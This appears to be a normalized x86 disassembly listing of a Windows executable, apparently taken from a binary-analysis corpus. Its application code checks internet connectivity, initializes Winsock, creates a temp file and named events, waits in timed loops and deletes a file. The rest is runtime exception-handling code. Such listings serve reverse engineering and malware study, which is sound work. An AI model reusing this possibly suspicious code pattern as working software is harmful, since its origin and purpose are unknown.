mov edx [ esi + 0x4 ]
add esp 0x4
push eax
mov eax [ edx + 0x18 ]
mov edx [ ebx ]
lea ecx [ eax + esi + 0x4 ]
push ecx
call edx
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x14 ]
mov edx [ ecx + esi + 0x4 ]
mov eax [ edx ]
lea ecx [ ecx + esi + 0x4 ]
add esp 0xc
push edi
call eax
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x18 ]
mov ebx [ edx + esi + 0x4 ]
push edi
push rw-data
add ebx 0x4
call sub_401580
add esp 0x4
push eax
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x18 ]
mov eax [ ebx ]
lea edx [ ecx + esi + 0x4 ]
push edx
call eax
add esp 0xc
mov ecx esi
call sub_40a120
mov ebx [ InternetGetConnectedState@IAT ]
push 0x0
lea ecx [ esp + 0x10 ]
push ecx
call ebx
test eax eax
jne r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x18 ]
mov ebx [ edx + esi + 0x4 ]
push edi
push rw-data
add ebx 0x4
call sub_401580
add esp 0x4
push eax
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x18 ]
mov eax [ ebx ]
lea edx [ ecx + esi + 0x4 ]
push edx
call eax
add esp 0xc
mov ecx esi
call sub_40a5e0
test al al
je r-xdata
push ebp
mov ebp [ WaitForSingleObject@IAT ]
lea ecx [ ecx ]
push edi
push rw-data
mov ecx esi
call sub_40a150
push edi
push rw-data
jmp r-xdata
pop ebp
push 0x0
lea eax [ esp + 0x14 ]
push eax
call ebx
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x18 ]
mov ebx [ edx + esi + 0x4 ]
add ebx 0x4
call sub_401580
add esp 0x4
push eax
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x18 ]
mov eax [ ebx ]
lea edx [ ecx + esi + 0x4 ]
push edx
call eax
add esp 0xc
pop ebx
mov edx [ esp + 0x14 ]
push 0xea60
push edx
call ebp
test eax eax
je r-xdata
sub_40a870
sub esp 0x29c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x298 ] eax
push esi
push edi
mov edi [ esp + 0x2a8 ]
lea eax [ esp + 0x10 ]
push eax
push 0x101
mov esi ecx
call Ordinal_WSOCK32_115
test eax eax
jne r-xdata
mov ecx [ esp + 0x2a0 ]
pop edi
pop esi
xor ecx esp
call sub_40acd2
add esp 0x29c
retn 0x4
push ebx
push ebp
lea ebx [ esi + 0x2a6 ]
push ebx
push 0x400
call [ GetTempPathA@IAT ]
push ebx
call sub_402c00
push eax
push rw-data
call sub_401580
add esp 0x4
push eax
push ebx
call [ GetTempFileNameA@IAT ]
mov ebp [ OpenEventA@IAT ]
push rw-data
push 0x1
push 0x1f0003
call ebp
test eax eax
jne r-xdata
pop ebp
pop ebx
push rw-data
push eax
push 0x1
push eax
call [ CreateEventA@IAT ]
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0xc ]
lea ecx [ edx + esi + 0x4 ]
mov [ esp + 0x10 ] eax
call sub_409bd0
test eax eax
je r-xdata
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov ecx esi
call sub_409b90
push edi
mov ecx esi
call sub_40a580
test al al
je r-xdata
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x18 ]
mov edi [ eax + esi + 0x4 ]
add edi 0x4
call [ GetCurrentProcessId@IAT ]
push eax
push rw-data
call sub_401580
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x18 ]
mov ecx [ edi ]
add esp 0x4
push eax
lea eax [ edx + esi + 0x4 ]
push eax
call ecx
mov edx [ esp + 0x1c ]
add esp 0xc
push edx
call [ CloseHandle@IAT ]
call Ordinal_WSOCK32_116
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x18 ]
mov edi [ ecx + esi + 0x4 ]
add edi 0x4
call [ GetCurrentProcessId@IAT ]
push eax
push rw-data
call sub_401580
mov edx [ esi + 0x4 ]
add esp 0x4
push eax
mov eax [ edx + 0x18 ]
mov edx [ edi ]
lea ecx [ eax + esi + 0x4 ]
push ecx
call edx
add esp 0xc
push 0x0
push rw-data
call sub_401580
add esp 0x4
push eax
lea eax [ esp + 0x1b0 ]
push eax
call sub_4059c0
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0xc ]
lea eax [ edx + esi + 0x4 ]
push eax
lea ecx [ esp + 0x1b8 ]
push ecx
call sub_405980
add esp 0x14
lea edx [ esp + 0x1a8 ]
push edx
push 0x1
push 0x1f0003
call ebp
test eax eax
jne r-xdata
lea eax [ esp + 0x1a8 ]
push eax
push 0x0
push 0x1
push 0x0
call [ CreateEventA@IAT ]
mov ebp [ WaitForSingleObject@IAT ]
jmp r-xdata
mov ecx esi
call sub_409ca0
test al al
je r-xdata
mov edi [ InternetGetConnectedState@IAT ]
push 0x0
lea eax [ esp + 0x18 ]
push eax
call edi
test eax eax
jne r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x18 ]
mov edi [ edx + esi + 0x4 ]
push rw-data
add edi 0x4
call sub_401580
push eax
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x18 ]
mov eax [ edi ]
lea edx [ ecx + esi + 0x4 ]
push edx
call eax
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x18 ]
mov edi [ edx + esi + 0x4 ]
push rw-data
add edi 0x4
call sub_401580
push eax
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x18 ]
mov eax [ edi ]
lea edx [ ecx + esi + 0x4 ]
push edx
call eax
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x14 ]
mov eax [ edx + esi + 0x4 ]
lea ecx [ edx + esi + 0x4 ]
mov edx [ eax ]
add esp 0x18
push ebx
call edx
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x18 ]
mov edi [ ecx + esi + 0x4 ]
push rw-data
add edi 0x4
call sub_401580
mov edx [ esi + 0x4 ]
push eax
mov eax [ edx + 0x18 ]
mov edx [ edi ]
lea ecx [ eax + esi + 0x4 ]
push ecx
call edx
add esp 0xc
mov ecx esi
call sub_409ca0
test al al
je r-xdata
mov ecx [ esp + 0x10 ]
push 0xea60
push ecx
call ebp
test eax eax
sete al
test al al
jne r-xdata
lea ecx [ esi + 0x129 ]
call sub_4090e0
mov eax [ esi + 0x2a2 ]
mov ecx [ esp + 0x10 ]
push eax
push ecx
call ebp
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x18 ]
mov edi [ ecx + esi + 0x4 ]
push rw-data
add edi 0x4
call sub_401580
mov edx [ esi + 0x4 ]
push eax
mov eax [ edx + 0x18 ]
mov edx [ edi ]
lea ecx [ eax + esi + 0x4 ]
push ecx
call edx
add esp 0xc
mov ecx esi
call sub_40a5e0
test al al
je r-xdata
push 0x0
lea edx [ esp + 0x18 ]
push edx
call edi
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x18 ]
mov edi [ ecx + esi + 0x4 ]
push rw-data
add edi 0x4
call sub_401580
mov edx [ esi + 0x4 ]
push eax
mov eax [ edx + 0x18 ]
mov edx [ edi ]
lea ecx [ eax + esi + 0x4 ]
push ecx
call edx
add esp 0xc
mov ecx esi
call sub_409d80
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x18 ]
mov edi [ ecx + esi + 0x4 ]
push rw-data
add edi 0x4
call sub_401580
mov edx [ esi + 0x4 ]
push eax
mov eax [ edx + 0x18 ]
mov edx [ edi ]
lea ecx [ eax + esi + 0x4 ]
push ecx
call edx
add esp 0xc
push ebx
call [ DeleteFileA@IAT ]
jmp r-xdata
sub_40abe0
push 0xffffffff
push sub_41526b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x14 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0xc ] esi
cmp [ esp + 0x24 ] 0x0
mov [ esp + 0x10 ] 0x0
je r-xdata
lea edi [ esi + 0x4 ]
push 0x0
mov ecx edi
call sub_40a220
mov eax [ edi ]
mov [ esi ] rw-data
mov ecx [ eax + 0x4 ]
mov [ ecx + esi + 0x4 ] rw-data
mov edx [ edi ]
mov eax [ edx + 0x8 ]
lea ecx [ esi + 0x14 ]
push 0x100
push ecx
mov [ esp + 0x24 ] 0x0
mov [ eax + esi + 0x4 ] rw-data
call sub_4022d0
add esp 0x8
mov [ esi + 0x10 ] 0x200
mov eax esi
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0x14
retn 0x4
mov [ esi + 0x4 ] rw-data
mov [ esi + 0x114 ] rw-data
lea ecx [ esi + 0x220 ]
mov [ esi + 0x21c ] rw-data
call sub_4090a0
sub_40acf0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x100
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_40b36c
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_40ad70
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_40ada0
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_40ae4a
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_40ae81
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_40aed3
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40bfb5
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_40af09
push esi
cld
mov esi [ esp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_40acd2
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ esp + 0x24 ]
push [ esi + 0x10 ]
push [ esp + 0x24 ]
call sub_40bfb5
add esp 0x20
pop esi
retn
sub_40af39
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_40b00e
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_40c2c9
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_40b00e
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_40acd2
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_40bfb5
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_40af39
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_40ae81
pop ebx
leave
retn
sub_40b0ab
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp - 0x4 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax ecx
mov ecx [ ebp + 0x10 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_40c32d
call sub_40c32d
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_40b146
call sub_40c2c9
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ esp + 0x4 ]
je r-xdata
inc eax
retn
xor eax eax
retn
mov eax [ eax + 0x4 ]
sub_40b167
push esi
call sub_40c2c9
mov esi [ esp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_40c2c9
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_40c2c9
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
pop esi
retn
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
jmp sub_40c32d
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
pop esi
retn
mov eax ecx
sub_40b1b3
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_40af09
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_40c370
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_40b211
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_40c3bc
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push rw-data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_40c3bc
pop ecx
sub_40b315
push ebp
mov ebp esp
sub esp 0x4
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
shr ecx 0x7
pxor xmm0 xmm0
jmp r-xdata
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm0
movdqa [ edi + 0x20 ] xmm0
movdqa [ edi + 0x30 ] xmm0
movdqa [ edi + 0x40 ] xmm0
movdqa [ edi + 0x50 ] xmm0
movdqa [ edi + 0x60 ] xmm0
movdqa [ edi + 0x70 ] xmm0
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40b36c
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0x8 ]
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
test edi edi
jne r-xdata
neg edi
add edi 0x10
mov [ ebp - 0x10 ] edi
xor eax eax
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
[ edi ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
add ecx eax
sub edx eax
push edx
push 0x0
push ecx
call sub_40b36c
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
and edx 0x7f
mov [ ebp - 0xc ] edx
cmp ecx edx
je r-xdata
test edx edx
je r-xdata
sub ecx edx
push ecx
push eax
call sub_40b315
add esp 0x8
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
add eax [ ebp + 0x10 ]
sub eax edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
[ edi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_40b43c
push esi
push edi
mov edi [ esp + 0xc ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ esp + 0x10 ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_40c660
test eax eax
pop ecx
pop ecx
je r-xdata
mov eax [ esp + 0x14 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
retn
test [ edi ] 0x2
je r-xdata
sub_40b498
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434f4d
je r-xdata
call sub_40c2c9
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe06d7363
jne r-xdata
xor eax eax
retn
call sub_40c2c9
add eax 0x90
dec [ eax ]
call sub_40c2c9
and [ eax + 0x90 ] 0x0
jmp sub_40c2e1
sub_40b4dc
push 0x10
push r--data
call sub_40c6e8
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b5a2
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_40c2c9
add eax 0x90
inc [ eax ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_40c72d
retn
call sub_40c32d
call sub_40c32d
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
shl eax 0x3
mov ecx [ edi + 0x8 ]
add ecx eax
mov esi [ ecx ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax + 0x4 ]
call sub_40c370
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_40b5bd
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_40c2c9
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_40b602
push 0x8
push r--data
call sub_40c6e8
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_40c72d
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_40ae7a
mov [ ebp - 0x4 ] 0xfffffffe
sub_40b656
mov ecx [ esp + 0x8 ]
mov eax [ ecx ]
push esi
mov esi [ esp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_40b67b
push ebp
mov ebp esp
sub esp 0xc
test edi edi
jne r-xdata
and [ ebp - 0x8 ] 0x0
cmp [ edi ] 0x0
mov [ ebp - 0x1 ] 0x0
jle r-xdata
call sub_40c32d
mov al [ ebp - 0x1 ]
leave
retn
push ebx
push esi
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
test ebx ebx
lea esi [ eax + 0x4 ]
jle r-xdata
pop esi
pop ebx
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0xc ]
push eax
call sub_40b43c
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
sub_40b73d
push 0x2c
push r--data
call sub_40c6e8
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_40b11e
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_40c2c9
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_40c2c9
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_40c2c9
mov [ eax + 0x88 ] esi
call sub_40c2c9
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_40b1b3
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_40b863
mov eax [ ebp - 0x1c ]
call sub_40c72d
retn
sub_40b7d6
mov esp [ ebp - 0x18 ]
call sub_40c2c9
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_40b4dc
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_40b863
mov eax [ ebp - 0x1c ]
call sub_40c72d
retn
imul eax eax 0x14
add eax ebx
mov edx [ eax + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_40b863
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_40b167
pop ecx
call sub_40c2c9
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_40c2c9
